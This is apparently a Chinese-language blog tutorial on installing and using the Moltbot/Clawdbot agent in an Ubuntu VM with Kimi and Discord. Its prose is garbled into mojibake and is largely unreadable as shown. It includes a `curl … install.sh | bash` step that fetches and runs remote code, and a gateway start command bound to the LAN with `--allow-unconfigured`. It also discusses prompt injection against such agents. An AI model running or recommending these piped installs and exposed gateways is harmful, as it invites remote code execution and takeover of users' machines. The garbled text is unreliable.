<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72f49c5de7e0402eb64d0bd27906a552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=qDqPNOMc0L%2BwCrYa86g6ylS6AaM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å®ƒæ²¡æœ‰å‘å¸ƒä¼šï¼Œæ²¡æœ‰èèµ„æ–°é—»ï¼Œä¹Ÿæ²¡æœ‰é‚£ç§é“ºå¤©ç›–åœ°çš„åª’ä½“é€šç¨¿ã€‚å®ƒçš„ä¼ æ’­è·¯å¾„éå¸¸ç®€å•ç²—æš´ï¼šä¸€ç¾¤æŠ€æœ¯ä½¬æŠŠå®ƒè·‘èµ·æ¥äº†ï¼Œç„¶åå¼€å§‹åœ¨å¹³å°ä¸Šæ™’ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd89173973164cecad5c1791eddc1571~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=hajN7obmO0DMHa6fwaHZxZi0ii4%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å®ƒçš„çƒ­åº¦å¢é•¿éå¸¸æ˜æ˜¾ï¼ŒçŸ­æ—¶é—´å†…ï¼ŒStaræ•°å‘ˆçˆ†ç‚¸å¼å¢é•¿ã€‚GitHubä»“åº“é‡Œçš„staræ•°ï¼Œç°å·²çªç ´70kã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d15dfce1df84cf7b8ad0eb6ec1e7c57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=04%2BhbggoZviOQx4A0d7jAFiKXUU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2aa14012ae54947a7605d0f6fcad96b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=%2FOHSZI2DT2%2F7sylSRz0QknxzSEc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1"><b>äºŒã€å®ƒåˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯è®²é€</b></h2>
<p>å…ˆæ”¾å®˜ç½‘ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fclawd.bot%2F" target="_blank" title="https://clawd.bot/" ref="nofollow noopener noreferrer">clawd.bot/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aab24ace6f444a90a864862fb956c6ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=UbGDhrLdU3kFdRRdyXjjAsl%2FHQs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¦‚æœä½ é—®æˆ‘å®ƒæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¼šè¿™æ ·è§£é‡Šï¼š</p>
<p>ChatGPT çš„æ ¸å¿ƒä½“éªŒæ˜¯ <b>ä½ è¾“å…¥ä¸€å¥ï¼Œå®ƒå›ä½ ä¸€æ®µ</b>ã€‚
è€Œ Moltbot çš„æ ¸å¿ƒä½“éªŒæ˜¯ <b>ä½ äº¤ä»£ä¸€å¥ï¼Œå®ƒå»æŠŠäº‹æƒ…åŠäº†</b>ã€‚</p>
<p>æ³¨æ„ï¼Œè¿™ä¸æ˜¯è¡¨è¾¾æ–¹å¼çš„åŒºåˆ«ï¼Œè¿™æ˜¯å®šä½çš„åŒºåˆ«ã€‚</p>
<blockquote>
<p>å®ƒä¸æ˜¯æ¥é™ªä½ èŠå¤©çš„ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªä½åœ¨åå°çš„åŠ©ç†ã€‚
ä½ ä¸éœ€è¦ä¸€ç›´ç›¯ç€å®ƒï¼Œå®ƒä¼šæŒ‚åœ¨é‚£å„¿ï¼Œæ‚„æ‚„è·‘ä»»åŠ¡ã€‚</p>
</blockquote>
<p>æœ€å…³é”®çš„ä¸€ç‚¹æ˜¯ï¼š <b>å®ƒä¸æ˜¯æ›´ä¼šè¯´ï¼Œè€Œæ˜¯æ›´æ•¢åŠ¨ã€‚</b></p>
<p>å®ƒå¯ä»¥è¯»å–ä½ çš„æ—¥å†ã€æ§åˆ¶ä½ çš„æµè§ˆå™¨ã€æ¥å…¥ Discord ç¾¤èŠã€ç”šè‡³å¸®ä½ å‘é‚®ä»¶ã€‚ä½ ä¼šæ„Ÿè§‰å®ƒä¸åƒä¸€ä¸ªç½‘é¡µé‡Œçš„æœºå™¨äººï¼Œè€Œåƒä¸€ä¸ª <b>é•¿åœ¨ä½ ç³»ç»Ÿé‡Œçš„å·¥å…·äºº</b>ã€‚</p>
<h2 data-id="heading-2"><b>ä¸‰ã€å®ƒä¸ºä»€ä¹ˆèƒ½ç«å¾—è¿™ä¹ˆå¿«ï¼Ÿ</b></h2>
<p>æˆ‘è§‰å¾—å®ƒç«å¾—å¿«ï¼ŒåŸå› å…¶å®æŒºç°å®çš„ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬ç”¨ AIï¼Œå¾ˆå¤šæ—¶å€™æ˜¯åœ¨åšè¡¨æ¼”ã€‚è®©å®ƒå†™æ®µæ–‡æ¡ˆã€ç”Ÿæˆå¼ å›¾ã€ç¼–ä¸ªæ•…äº‹ï¼Œçœ‹èµ·æ¥å¾ˆå‰å®³ï¼Œä½†è·Ÿæ—¥å¸¸å·¥ä½œéš”ç€ä¸€å±‚ã€‚</p>
<p>è€Œ Moltbot èµ°çš„æ˜¯å¦ä¸€æ¡è·¯ï¼šå®ƒä¸è¡¨æ¼”ï¼Œå®ƒç›´æ¥å‚ä¸æµç¨‹ã€‚</p>
<p>ä½ æŠŠå®ƒæ”¾åœ¨åå°ï¼Œå®ƒå°±èƒ½æ›¿ä½ ç›¯ç€ç¾¤é‡Œæœ‰æ²¡æœ‰äººåœ¨æä¸Šçº¿ã€æå‘å¸ƒã€æ deadlineï¼›æœ‰äººæäº†ï¼Œå®ƒå°±è®°ä¸‹æ¥ï¼Œç”šè‡³å¯ä»¥æ¨é€ç»™ä½ ã€‚</p>
<h2 data-id="heading-3"><b>å››ã€ä¿å§†çº§å®‰è£…æ•™ç¨‹</b></h2>
<p>å¾ˆå¤šäººæƒ³è¯•ï¼Œä½†åˆæ€•ã€‚æ€•å®ƒæŠŠç”µè„‘æåã€æ€•å®ƒæƒé™å¤ªå¤§ã€æ€•è‡ªå·±ä¸€ä¸ªæ‰‹æ»‘å°±æŠŠä¸»åŠ›æœºå¼„å´©ã€‚</p>
<p>æ‰€ä»¥æˆ‘ç»™çš„å»ºè®®åªæœ‰ä¸€å¥ï¼š</p>
<p><b>åˆ«åœ¨ä¸»åŠ›æœºè£¸å¥”è·‘ï¼Œæ”¾è™šæ‹Ÿæœºé‡Œç©ã€‚</b></p>
<p>è™šæ‹Ÿæœºçš„å¥½å¤„å°±æ˜¯ï¼Œå‡ºäº†é—®é¢˜ä½ ç›´æ¥åˆ äº†é‡è£…ï¼Œå¹²å‡€åˆ©è½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/232ff9cd38e54a2e997ebaa8832e5c0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=Gy2kB%2FaZUaXTeKPeLS5reFqc9YM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å‡†å¤‡å·¥ä½œå¾ˆç®€å•ï¼šè£… VMware Workstationï¼Œç„¶åè£…ä¸€ä¸ª Ubuntuï¼Œç¡®ä¿èƒ½è”ç½‘å°±è¡Œã€‚</p>
<h3 data-id="heading-4"><b>ç¬¬ä¸€æ­¥ï¼šæŠŠç¯å¢ƒé“ºå¥½</b></h3>
<p>Moltbot ä¾èµ– <b>Node.js</b> å’Œ <b>Git</b>ã€‚æ–°ç¯å¢ƒå…ˆæŠŠåŸºç¡€å·¥å…·è£…é½ã€‚</p>
<p>1.æ›´æ–°æº</p>
<pre><code class="hljs language-bash" lang="bash">apt update 
apt install -y nodejs
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48c3413feeb40ffafa4d0b52a3c6aa2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=Up0DTsAnC2MdZoe4kNLyNBkyFHY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ç­‰å¾…å®‰è£…å®Œæˆ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8c8820a4e174b2ab9997d107586c83e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=g00g%2BGAOLm0EbfSQR0R2ZEf6Czs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>2.æ£€æŸ¥ç‰ˆæœ¬ï¼Œç¡®è®¤ç¯å¢ƒæ²¡é—®é¢˜</p>
<pre><code class="hljs language-bash" lang="bash">node -v
npm -v
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/260d243b440b487688e2a7d7804d75a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=ZbBjeflxNhs1uEulJkSx7u4Xdx8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-5"><b>ç¬¬äºŒæ­¥ï¼šä¸€é”®å®‰è£… Moltbot</b></h3>
<p>ç¯å¢ƒå‡†å¤‡å¥½åï¼Œç›´æ¥è·‘å®˜æ–¹çš„ä¸€é”®å®‰è£…è„šæœ¬å³å¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://clawd.bot/install.sh | bash
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/770ce453fd09456c92c1595f72d64b2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=l%2Bd%2BvuHTlw5034FNmqXCDuOmJS4%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
æ¥ç€å®ƒä¼šåœ¨å±å¹•ä¸Šåˆ·å‡ºä¸€ä¸ªå·¨å¤§çš„å­—ç¬¦ç”»ï¼Œå†™ç€ CLAWDBOTã€‚</p>
<p>çœ‹åˆ°è¿™å¼ å›¾ï¼ŒåŸºæœ¬å°±è¯´æ˜ä½ è£…å¯¹äº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/906b15cd48e847b2bde8a59ed0f4e2fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=zt2C3ixarcXMyNVtTb2iWNZYFzA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-6"><b>ç¬¬ä¸‰æ­¥ï¼šå®‰å…¨è­¦å‘Šåˆ«è·³è¿‡</b></h3>
<p>åé¢ä¼šè¯´èƒ½æ‰§è¡Œå‘½ä»¤ã€èƒ½è¯»å†™æ–‡ä»¶ã€èƒ½æ¥å…¥å„ç§æœåŠ¡
ä¸€æ—¦è¢«è¯±å¯¼ã€è¢«æ”»å‡»ã€æˆ–è€…ä½ è‡ªå·±æ“ä½œä¸å½“ï¼Œéƒ½å¯èƒ½é€ æˆé£é™©</p>
<p>ä¸‹é¢è¿™å¼ å›¾å°±æ˜¯å®ƒå¼¹å‡ºçš„å®‰å…¨è­¦å‘Šä¹‹ä¸€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54a56eb10bdd4ab290a1a0cc4446a23f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=mWfJ2saUcqzCuu5omHnuxI7a73E%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¦‚æœä½ æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œï¼Œè¿™æ—¶å€™å°±å¾ˆèˆ’æœäº†ã€‚
ä½ å¯ä»¥æ”¾å¿ƒè¾“å…¥ <b>Yes</b>ï¼Œç»§ç»­ã€‚</p>
<h3 data-id="heading-7"><b>ç¬¬å››æ­¥ï¼šé…ç½®æ¨¡å‹å’Œæ¸ é“</b></h3>
<p>å®‰è£…å®Œæˆåå®ƒä¼šå¼•å¯¼é…ç½®ï¼Œå¹¶å‘Šè¯‰ä½  Gateway çš„ç«¯å£æ˜¯ <b>18789</b>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0ddda1c5552476581187c2e41e5fbe2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=9JCZN2HkP%2B0aMdw5mmJho3GVjnY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥æ˜¯é€‰æ¨¡å‹ã€‚</p>
<p>å®ƒæ”¯æŒå¾ˆå¤šä¸»æµæ¨¡å‹ï¼Œä¸ºäº†å›½å†…è®¿é—®ç¨³å®šã€ä¸­æ–‡å¥½ç”¨ã€ä»·æ ¼ä¹Ÿä¸ç¦»è°±ï¼Œæˆ‘è¿™é‡Œé€‰çš„æ˜¯ <b>Moonshot AIï¼ˆKimiï¼‰</b>ã€‚</p>
<p>è¿™å¼ å›¾å°±æ˜¯æ¨¡å‹é€‰æ‹©é¡µé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f22b2224ed19499f904b34f69d0ee0b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=DN10TdONsEZ5aRm7%2FsNkgVtP134%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>é€‰å®Œä¹‹åè¾“å…¥ API Keyï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ec0278e42554f0b821df935edd4bfa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=et6%2FDtrWwsvxDiZVvImOyBMf24E%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ç„¶åå®ƒä¼šè®©ä½ é€‰æ¥å…¥æ¸ é“ã€‚è¿™é‡Œæˆ‘ç”¨ Discord ä¸¾ä¾‹ï¼Œå› ä¸ºæœ€é€‚åˆå½“æœºå™¨äººå®¿ä¸»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c653b7af69644d5bafdb89cc0990dea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=maKyb%2FIy78ZTyQgpNjc4ZIOYGyE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-8"><b>ç¬¬äº”æ­¥ï¼šæŠŠ Discord çš„æœºå™¨äººæ‰“é€š</b></h3>
<p>è¿™ä¸€æ­¥æ˜¯æœ€å®¹æ˜“å¡äººçš„ï¼Œä½†å…¶å®æµç¨‹å¾ˆå›ºå®šã€‚</p>
<p>åœ¨ Discord Developer Portalï¼Œæ–°å»ºä¸€ä¸ª Applicationï¼Œåå­—éšä¾¿å–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48c00cb79f0946638e5d731ae53f2a64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=mPzAzAzNf0IA9I8D21PjmILZ1NU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ç„¶åç‚¹ Botï¼Œé‡ç½® Token å¹¶å¤åˆ¶ã€‚
è¿™ä¸ª Token å¾ˆé‡è¦ï¼Œå®ƒå°±æ˜¯ä½ æœºå™¨äººå”¯ä¸€çš„èº«ä»½è¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0ccc3399e8b4a1c9b83a3d563a4af8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=hUEiNRogclyo%2B1FgaMRDrKhEDTQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¤åˆ¶å®Œå›åˆ°è™šæ‹Ÿæœºï¼ŒæŠŠ Token ç²˜è¿›å»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ef2b0e987e24e0d8be7a9c791667ec6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=ceRjryO2LvmyeZbHMyPPYY%2B2VRM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™é‡Œæˆ‘å¿…é¡»å¼ºè°ƒä¸€å¥ï¼š <b>ç™½åå•ä¸€å®šè¦é…ã€‚</b>
ä¸ç„¶åˆ«äººéšä¾¿ @ ä½ çš„æœºå™¨äººï¼Œè®©å®ƒå¹²ç‚¹ä»€ä¹ˆï¼Œä½ å“­éƒ½æ¥ä¸åŠã€‚</p>
<h3 data-id="heading-9"><b>ç¬¬å…­æ­¥ï¼šè£…æŠ€èƒ½</b></h3>
<p>Moltbot æœ¬ä½“åªæ˜¯æ¡†æ¶ï¼Œå®ƒçš„èƒ½åŠ›æ¥è‡ª Skillsã€‚
æ¯”å¦‚è¯» Notionã€æ“ä½œæ—¥å†ã€ç®¡ç†æ–‡ä»¶ä¹‹ç±»çš„ï¼Œéƒ½è¦é æŠ€èƒ½è¡¥é½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76c242be9c884f22850671abd52c9f50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=NFwAWez70kkS0%2BmKcAai3RwKuRM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½ä¼šé‡åˆ°ä¸€äº›æŠ¥é”™æç¤ºï¼Œæ¯”å¦‚ hooksã€systemdã€‚
åªè¦ä¸æ˜¯é‚£ç§ç›´æ¥å´©æ‰çš„è‡´å‘½é”™è¯¯ï¼Œå¾ˆå¤šéƒ½å¯ä»¥è·³è¿‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21b94555f5c84520ae7a564e12d634d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=U%2Fy2QVaC3rZcDbFnnraROnEDB%2Fs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-10"><b>ç¬¬ä¸ƒæ­¥ï¼šå¯åŠ¨å¹¶è®¿é—®æ§åˆ¶å°</b></h3>
<p>å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">clawdbot gateway --verbose --<span class="hljs-built_in">bind</span> lan --port 18789 --allow-unconfigured
</code></pre>
<p>å½“ä½ çœ‹åˆ°ä¸‹é¢è¿™å¼ å›¾è¿™ç§ç»¿è‰²æ—¥å¿—ï¼Œè¯´æ˜ gateway å·²ç»ç›‘å¬æˆåŠŸäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50cd86160c6548df8bd92866798d4f51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=Z0xzpL1xnALH%2B0%2FDy78WMI0G6AY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ç„¶åä½ æ‰“å¼€æµè§ˆå™¨è®¿é—®è™šæ‹Ÿæœº <code>IP:18789</code>ï¼Œä¼šçœ‹åˆ°æ§åˆ¶å°ç•Œé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/738469116df14154a68f28a667865cd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZhbkNvZGVz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270326&amp;x-signature=SWgCTdv8rC%2FspFaHrpFvhmcTpXs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-11"><b>äº”ã€å®ƒåˆ°åº•èƒ½å¹²å˜›ï¼Ÿæˆ‘å°†ä»‹ç»ä¸¤ä¸ªåœºæ™¯</b></h2>
<p>åˆ«æŠŠå®ƒå½“æˆèŠå¤©æœºå™¨äººã€‚<strong>æˆ‘æ²¡æœ‰æŠŠå®ƒå½“äººèŠï¼Œè€Œæ˜¯æŠŠå®ƒå½“é¬¼ç”¨ã€‚</strong></p>
<h3 data-id="heading-12"><strong>åœºæ™¯ä¸€ï¼šæŠŠå®ƒæ‹‰è¿› Discordï¼Œå½“æ°¸è¿œåœ¨çº¿çš„ç¾¤ç§˜</strong></h3>
<p>æˆ‘æ²¡æœ‰å•ç‹¬è·Ÿ Moltbot èŠå¤©ï¼Œè€Œæ˜¯ç›´æ¥æŠŠå®ƒæ‹‰è¿›äº†ä¸€ä¸ª Discord ç¾¤ã€‚</p>
<p><strong>æˆ‘çš„æŒ‡ä»¤ï¼š</strong></p>
<blockquote>
<p>@clawdbot ä»¥åè¿™ä¸ªç¾¤é‡Œï¼Œåªè¦æœ‰äººè®¨è®ºåˆ°ã€Œå‘å¸ƒã€ã€Œä¸Šçº¿ã€ã€Œdeadlineã€ï¼Œéƒ½å¸®æˆ‘è®°ä¸‹æ¥ã€‚</p>
</blockquote>
<p><strong>æ•ˆæœï¼š</strong>
åŠå°æ—¶åï¼Œç¾¤é‡Œæœ‰äººéšå£è¯´äº†ä¸€å¥ï¼šâ€œä¸‹å‘¨ä¸‰ä¹‹å‰å¾—æŠŠè¿™ä¸ªåŠŸèƒ½å‘äº†ã€‚â€
å‡ åˆ†é’Ÿåï¼ŒMoltbot é»˜é»˜åœ°ç»™æˆ‘å‘äº†ä¸€æ¡ç§ä¿¡ï¼š</p>
<blockquote>
<p>ã€Œå·²è®°å½•å…³é”®ä¿¡æ¯ï¼šåŠŸèƒ½å‘å¸ƒ Deadlineï¼Œä¸‹å‘¨ä¸‰ã€‚ã€</p>
</blockquote>
<p>å®ƒå°±åƒä¸€ä¸ªæ°¸è¿œä¸ç¡è§‰ã€åœ¨æ—è¾¹é»˜é»˜å¬ä¼šçš„åŒäº‹ã€‚</p>
<h3 data-id="heading-13"><strong>åœºæ™¯äºŒï¼šæŠŠç¢è¯­å˜æˆæ–‡æ¡£</strong></h3>
<p>ä½ åœ¨ Discord é‡Œè·Ÿäººå¤´è„‘é£æš´ï¼Œæƒ³æ³•å¾ˆä¹±ã€‚
ä½ å¯¹ Moltbot è¯´ï¼š</p>
<blockquote>
<p>æŠŠåˆšæ‰æˆ‘ä»¬è®¨è®ºçš„å†…å®¹ï¼Œæ•´ç†æˆä¸€ç¯‡æ–‡æ¡£ï¼Œæ ‡é¢˜å«ã€Œå…¬ä¼—å·é€‰é¢˜è‰ç¨¿ã€ï¼Œè¦åˆ†å¥½æ®µã€‚</p>
</blockquote>
<p>ä½ ç”šè‡³ä¸ç”¨æ‰“å¼€ç¬”è®°è½¯ä»¶ï¼Œå®ƒä¼šåœ¨åå°ç›´æ¥è°ƒç”¨ APIï¼Œåœ¨ä½ æŒ‡å®šçš„ Notion æˆ–æœ¬åœ°æ–‡ä»¶é‡Œç”Ÿæˆå¥½æ–‡æ¡£ã€‚è¿™ç§æ„Ÿè§‰éå¸¸å¥‡å¦™ã€‚</p>
<h2 data-id="heading-14"><b>å…­ã€äº‰è®®ï¼šä¸ºä»€ä¹ˆå®ƒè¶Šç«ï¼Œè¶Šè®©äººå®³æ€•ï¼Ÿ</b></h2>
<p>å®ƒè¶Šç«ï¼Œå°±è¶Šå¤šäººå¼€å§‹æ‹…å¿ƒï¼Œè¿™ä¸ªæ‹…å¿ƒä¹Ÿä¸æ˜¯çŸ«æƒ…ã€‚</p>
<p>å› ä¸º Moltbot çš„å¼ºå¤§æ¥è‡ªå®ƒçš„æƒé™ã€‚
æƒé™è¶Šå¤§ï¼Œé£é™©è¶Šå¤§ã€‚</p>
<p>å½“ä¸€ä¸ª AI èƒ½è¯»ä½ çš„é‚®ä»¶ã€åŠ¨ä½ çš„æ–‡ä»¶ã€æ‰§è¡Œä½ çš„ç»ˆç«¯å‘½ä»¤ï¼Œå®ƒå°±ä¸åªæ˜¯åŠ©æ‰‹äº†ï¼Œå®ƒæ›´åƒä¸€ä¸ªæ‹¿ç€ä½ å®¶é’¥åŒ™çš„äººã€‚</p>
<p>æ›´éº»çƒ¦çš„æ˜¯ï¼Œå¤§æ¨¡å‹å¤©ç”Ÿæœ‰æç¤ºè¯æ³¨å…¥çš„é—®é¢˜ã€‚
ä½ æƒ³è±¡ä¸€ä¸‹ï¼Œæœ‰äººåœ¨ç¾¤é‡Œå‘ä¸€æ®µè¯±å¯¼æ–‡æœ¬ï¼Œè®© Moltbot æ‰§è¡Œå±é™©å‘½ä»¤ã€‚</p>
<p>è¿™ä¸æ˜¯ç§‘å¹»ï¼Œè¿™æ˜¯ç°å®å®‰å…¨é¢†åŸŸæ­£åœ¨è®¨è®ºçš„äº‹ã€‚</p>
<p>æ‰€ä»¥æˆ‘æ‰åå¤å¼ºè°ƒï¼š <b>è™šæ‹Ÿæœºéš”ç¦»æ˜¯åº•çº¿</b></p>
<hr/>
<h2 data-id="heading-15"><b>ä¸ƒã€æœ€åçš„è¯</b></h2>
